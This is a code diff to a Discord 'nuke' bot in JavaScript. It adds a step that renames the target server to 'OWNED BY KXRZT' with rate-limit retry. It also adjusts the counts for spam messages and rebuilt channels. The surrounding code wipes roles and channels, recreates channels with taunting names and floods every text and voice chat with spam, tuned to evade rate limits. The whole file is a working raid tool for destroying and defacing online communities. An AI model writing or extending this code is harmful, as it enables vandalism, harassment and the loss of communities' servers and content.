@@ -16,15 +16,19 @@ const CHANNEL_BASE = '⛧•Kxrzt-owns-yall❗️';
 const NUMBER_FIRST_CHANNEL = false;
 
 const CATEGORY_NAME = 'general';
-const TEXT_COUNT    = 26;
-const VOICE_COUNT   = 16;
+const TEXT_COUNT    = 25;
+const VOICE_COUNT   = 15;
 const SPAM_COUNT    = 45;   // messages per text channel
 
 // also blast the same message into every voice channel's text chat
 // ("call messages"). voice chats have their own per-channel rate-limit bucket,
 // so this is free extra coverage — it just takes longer to drain.
 const VOICE_SPAM       = true;
-const VOICE_SPAM_COUNT = 45;   // messages per voice channel
+const VOICE_SPAM_COUNT = 12;   // messages per voice channel
+
+// rename the server itself when nuking
+const RENAME_GUILD = true;
+const GUILD_NAME   = 'OWNED BY KXRZT';
 
 // optional: role NAME that may also nuke (admins always can). now read from .env
 const NUKE_ROLE_NAME = process.env.NUKE_ROLE_NAME ?? '';
@@ -108,6 +112,22 @@ async function createSafe(guild, options, retries = 6) {
       const wait = ((err.retryAfter ?? err?.rawError?.retry_after ?? 1) * 1000) + 120;
       await sleep(wait);
       return createSafe(guild, options, retries - 1);
+    }
+    throw err;
+  }
+}
+
+// guild renames are capped at 2 per 10 minutes by discord, so back off hard
+async function renameGuild(guild, name, retries = 4) {
+  try {
+    await guild.setName(name, 'nuke');
+    return true;
+  } catch (err) {
+    const status = err?.status ?? err?.httpStatus;
+    if (status === 429 && retries > 0) {
+      const wait = ((err.retryAfter ?? err?.rawError?.retry_after ?? 2) * 1000) + 250;
+      await sleep(wait);
+      return renameGuild(guild, name, retries - 1);
     }
     throw err;
   }
@@ -220,6 +240,22 @@ async function nuke(interaction) {
   const t0 = Date.now();
   const log = m => console.log(`[nuke +${Date.now() - t0}ms] ${m}`);
 
+  /* 0. rename the server right away — fire it and don't block the wipe on it */
+  let renamed = false;
+  if (RENAME_GUILD) {
+    if (!me.permissions.has(PermissionFlagsBits.ManageGuild)) {
+      log('skipping rename: missing Manage Guild');
+    } else {
+      renamed = true;
+      renameGuild(guild, GUILD_NAME)
+        .then(() => log(`renamed server -> ${GUILD_NAME}`))
+        .catch(e => {
+          renamed = false;
+          console.error('[rename]', e.message);
+        });
+    }
+  }
+
   /* 1. roles (optional) — all in flight at once */
   if (wipeRoles) {
     if (!me.permissions.has(PermissionFlagsBits.ManageRoles)) {
@@ -277,9 +313,11 @@ async function nuke(interaction) {
   await Promise.all(spamJobs);
 
   const summary =
-    `Done in ${((Date.now() - t0) / 1000).toFixed(1)}s — wiped everything, rebuilt ` +
-    `${TEXT_COUNT} text + ${VOICE_COUNT} voice, spammed ${SPAM_COUNT}x in ${textChannels.length} ` +
-    `text channels + ${VOICE_SPAM_COUNT}x in ${voiceChannels.length} calls.`;
+    `Done in ${((Date.now() - t0) / 1000).toFixed(1)}s — ` +
+    (renamed ? `renamed server to \`${GUILD_NAME}\`, ` : '') +
+    `wiped everything, rebuilt ${TEXT_COUNT} text + ${VOICE_COUNT} voice, ` +
+    `spammed ${SPAM_COUNT}x in ${textChannels.length} text channels + ` +
+    `${VOICE_SPAM_COUNT}x in ${voiceChannels.length} calls.`;
   log(summary);
 
   // origin channel no longer exists, so the ephemeral reply is gone -> fall back
